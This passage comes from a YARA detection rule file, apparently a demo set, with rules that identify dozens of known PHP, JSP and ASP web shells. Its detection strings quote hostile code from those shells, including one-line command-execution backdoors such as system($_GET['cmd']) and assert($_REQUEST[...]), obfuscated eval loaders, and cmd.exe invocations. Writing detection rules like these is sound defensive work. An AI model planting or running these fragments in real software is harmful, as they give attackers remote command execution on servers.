      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:29:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword
   condition: 
      all of them
} 

rule Webshell_jsp_tree_RID2E02 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file tree.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:56:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "$('#tt2').tree('options').url = \"selectChild.action?checki" 
      $s6 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+requ" 
   condition: 
      all of them
} 

rule Webshell_C99madShell_v_3_0_smowu_RID3315 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file smowu.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:32:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Enter ::</b><for" 
      $s8 = "<p><font color=red>Wordpress Not Found! <input type=text id=\"wp_pat\"><input ty" 
   condition: 
      1 of them
} 

rule Webshell_simple_backdoor_RID30D4 : DEMO MAL T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file simple-backdoor.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:56:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$cmd = ($_REQUEST['cmd']);" fullword
      $s1 = "if(isset($_REQUEST['cmd'])){" fullword
      $s4 = "system($cmd);" fullword
   condition: 
      2 of them
} 

rule Webshell_PHP_404_b_RID2D46 : DEMO T1087 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file 404.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:24:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1087, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "<span>Posix_getpwuid (\"Read\" /etc/passwd)" 
   condition: 
      all of them
} 

rule Webshell_Antichat_Shell_v1_3_2_RID3252 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Antichat Shell v1.3.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:00:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><m" 
   condition: 
      all of them
} 

rule Webshell_Safe_mode_breaker_RID3164 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Safe mode breaker.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:20:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "preg_match(\"/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is(" 
      $s6 = "$path =\"{$root}\".((substr($root,-1)!=\"/\") ? \"/\" : NULL)." 
   condition: 
      1 of them
} 

rule Webshell_Sst_Sheller_RID2F0E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Sst-Sheller.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:40:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo \"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>" 
      $s3 = "<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)" 
   condition: 
      all of them
} 

rule Webshell_PHPJackal_v1_5_RID2F6E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file PHPJackal v1.5.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:56:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "echo \"<center>${t}MySQL cilent:</td><td bgcolor=\\\"#333333\\\"></td></tr><form" 
      $s8 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr" 
   condition: 
      all of them
} 

rule Webshell_customize_RID2E89 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file customize.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:18:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z" 
   condition: 
      all of them
} 

rule Webshell_s72_Shell_v1_1_Coding_RID3222 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file s72 Shell v1.1 Coding.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:52:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya " 
   condition: 
      all of them
} 

rule Webshell_jsp_sys3_RID2DE4 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file sys3.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:51:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">" fullword
      $s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"" 
      $s9 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword
   condition: 
      all of them
} 

rule Webshell_jsp_guige02_RID2EC5 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file guige02.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:28:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#fff" 
      $s1 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private" 
   condition: 
      all of them
} 

rule Webshell_WinX_Shell_RID2E83 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file WinX Shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:17:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">Filenam" 
      $s8 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">File: </" 
   condition: 
      all of them
} 

rule Webshell_Crystal_Crystal_RID30C9 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Crystal.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:54:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value" 
      $s6 = "\" href=\"?act=tools\"><font color=#CC0000 size=\"3\">Tools</font></a></span></f" 
   condition: 
      all of them
} 

rule Webshell_r57_1_4_0_RID2D36 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file r57.1.4.0.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:22:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "@ini_set('error_log',NULL);" fullword
      $s6 = "$pass='abcdef1234567890abcdef1234567890';" fullword
      $s7 = "@ini_restore(\"disable_functions\");" fullword
      $s9 = "@ini_restore(\"safe_mode_exec_dir\");" fullword
   condition: 
      all of them
} 

rule Webshell_asp_ajn_RID2D82 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file ajn.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:34:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword
      $s6 = "seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOve" 
   condition: 
      all of them
} 

rule Webshell_php_cmd_RID2D81 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file cmd.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:34:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if($_GET['cmd']) {" fullword
      $s1 = "// cmd.php = Command Execution" fullword
      $s7 = "  system($_GET['cmd']);" fullword
   condition: 
      all of them
} 

rule Webshell_asp_list_RID2E05 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file list.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:56:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">" fullword
      $s4 = "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")" fullword
   condition: 
      all of them
} 

rule Webshell_PHP_co_RID2CBF : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file co.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:02:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV" fullword
      $s11 = "6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j" fullword
   condition: 
      all of them
} 

rule Webshell_PHP_150_RID2C83 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file 150.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:52:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "HJ3HjqxclkZfp" 
      $s1 = "<? eval(gzinflate(base64_decode('" fullword
   condition: 
      all of them
} 

rule Webshell_jsp_cmdjsp_2_RID2F64 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file cmdjsp.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:55:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
      $s4 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
   condition: 
      all of them
} 

rule Webshell_PHP_c37_RID2CBA : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file c37.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:01:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj')," 
      $s9 = "++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE]," 
   condition: 
      all of them
} 

rule Webshell_PHP_b37_RID2CB9 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file b37.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:01:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc" 
   condition: 
      all of them
} 

rule Webshell_php_backdoor_RID2F92 : DEMO MAL T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file php-backdoor.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:02:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))" fullword
      $s2 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input " 
   condition: 
      all of them
} 

rule Webshell_asp_dabao_RID2E40 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file dabao.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:06:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = " Echo \"<input type=button name=Submit onclick=\"\"document.location =&#039;\" &" 
      $s8 = " Echo \"document.Frm_Pack.FileName.value=\"\"\"\"+year+\"\"-\"\"+(month+1)+\"\"-" 
   condition: 
      all of them
} 

rule Webshell_php_2_RID2C7F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file 2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:51:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php assert($_REQUEST[\"c\"]);?> " fullword
   condition: 
      all of them
} 

rule Webshell_asp_cmdasp_RID2EC1 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file cmdasp.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:28:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
      $s7 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
   condition: 
      all of them
} 

rule Webshell_spjspshell_RID2EEE : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file spjspshell.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:35:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:" 
   condition: 
      all of them
} 

rule Webshell_jsp_action_RID2ED0 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file action.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:30:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword
      $s6 = "<%@ page contentType=\"text/html;charset=gb2312\"%>" fullword
   condition: 
      all of them
} 

rule Webshell_Inderxer_RID2DE7 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Inderxer.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:51:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ" 
   condition: 
      all of them
} 

rule Webshell_asp_Rader_RID2E37 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Rader.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:05:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0" 
      $s3 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 " 
   condition: 
      all of them
} 

rule Webshell_c99_madnet_smowu_RID30ED : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file smowu.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:00:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "//Authentication" fullword
      $s1 = "$login = \"" fullword
      $s2 = "eval(gzinflate(base64_decode('" 
      $s4 = "//Pass" 
      $s5 = "$md5_pass = \"" 
      $s6 = "//If no pass then hash" 
   condition: 
      all of them
} 

rule Webshell_minupload_RID2E6F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file minupload.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:14:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">   " fullword
      $s9 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859" 
   condition: 
      all of them
} 

rule Webshell_ELMALISEKER_Backd00r_RID30DA : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file ELMALISEKER Backd00r.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:57:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "response.write(\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio" 
      $s2 = "if FP = \"RefreshFolder\" or request.form(\"cmdOption\")=\"DeleteFolder\" or req" 
   condition: 
      all of them
} 

rule Webshell_PHP_bug_1__RID2E1A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file bug (1).php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:00:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@include($_GET['bug']);" fullword
   condition: 
      all of them
} 

rule Webshell_caidao_shell_hkmjj_RID31F1 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file hkmjj.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:44:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "codeds=\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\"  " fullword
   condition: 
      all of them
} 

rule Webshell_jsp_asd_RID2D8A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file asd.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:36:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>" fullword
      $s6 = "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url" 
   condition: 
      all of them
} 

rule Webshell_metaslsoft_RID2EE8 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file metaslsoft.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:34:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "$buff .= \"<tr><td><a href=\\\"?d=\".$pwd.\"\\\">[ $folder ]</a></td><td>LINK</t" 
   condition: 
      all of them
} 

rule Webshell_asp_Ajan_RID2DC3 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Ajan.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:45:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreate" 
   condition: 
      all of them
} 

rule Webshell_config_myxx_zend_RID3161 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files config.jsp, myxx.jsp, zend.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:20:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = ".println(\"<a href=\\\"javascript:alert('You Are In File Now ! Can Not Pack !');" 
   condition: 
      all of them
} 

rule Webshell_404_data_suiyue_RID303A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files 404.jsp, data.jsp, suiyue.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:30:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = " sbCopy.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+" 
   condition: 
      all of them
} 

rule Webshell_JFolder_Leo_RID2ECB : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:29:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);" fullword
      $s5 = "long time = (System.currentTimeMillis() - starttime) / 1000l;" fullword
   condition: 
      all of them
} 

rule Webshell_phpspy_arabicspy_RID3167 : DEMO T1007 T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:21:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1007, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname." 
   condition: 
      all of them
} 

rule Webshell_C99_Shell_ci_Biz_RID3061 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:37:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\"" 
   condition: 
      all of them
} 

rule Webshell_c99_c99shell_2_RID2F58 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files c99.php, c99shell.php, c99.php, c99shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:53:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "$bindport_pass = \"c99\";" fullword
      $s5 = " else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = tr" 
   condition: 
      1 of them
} 

rule Webshell_c99_locus7s_c99_w4cking_xxx_RID34BB : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:43:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$res = @shell_exec($cfe);" fullword
      $s8 = "$res = @ob_get_contents();" fullword
      $s9 = "@exec($cfe,$res);" fullword
   condition: 
      2 of them
} 

rule Webshell_h4ntu_shell_powered_by_tsoi__RID361C : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file h4ntu shell [powered by tsoi].php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 16:41:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Adress:</b" 
      $s3 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> ui" 
      $s4 = "    <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><?= $info ?>: <?= " 
      $s5 = "<INPUT TYPE=\"text\" NAME=\"cmd\" value=\"<?php echo stripslashes(htmlentities($" 
   condition: 
      all of them
} 

rule Webshell_PHP_a_RID2C4E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file a.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:43:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"" 
      $s2 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>" 
      $s4 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p> " fullword
   condition: 
      2 of them
} 

